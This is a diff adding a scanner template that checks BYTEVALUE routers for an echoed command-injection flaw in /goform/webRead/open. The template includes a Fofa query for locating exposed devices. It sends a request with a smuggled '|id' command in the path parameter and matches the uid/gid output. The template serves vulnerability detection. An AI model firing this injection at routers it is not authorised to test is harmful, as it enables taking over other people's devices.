@@ -1,0 +1,28 @@
+id: bytevalue-webread-rce
+
+info:
+  name: 百为智能流控路由器命令执行
+  author: zan8in
+  severity: critical
+  description: |
+    百为智能流控路由器/goform/webRead/open 路由的 ?path 参数存在有回显的命令注入漏洞。攻击者可通过该漏洞在服务器端执行命令，写入后门，获取服务器权限，从而获取路由器权限。
+    Fofa: title="BYTEVALUE 智能流控路由器"
+  reference:
+    - https://mp.weixin.qq.com/s/h0hUSZbjM15ehEfRqcb5eQ
+  tags: bytevalue,rce
+flow: |
+  http("r0")
+
+http:
+  - id: "r0"
+    raw:
+      - |
+        GET /goform/webRead/open/?path=|id HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200 && regex("((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)",body)
+        condition: and
+
